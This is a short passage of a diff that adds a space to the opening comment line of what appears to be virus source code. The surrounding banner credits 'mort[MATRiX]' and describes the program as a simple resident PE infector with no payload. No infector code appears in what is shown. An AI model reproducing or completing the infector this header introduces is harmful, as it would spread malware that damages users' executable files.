@@ -1,6 +1,6 @@
 
 
-comment"
+comment "
 2M - created by mort[MATRiX]
          - simple resident PE infetor
          - no payload (ok,...the last one),...maybe there's no check 
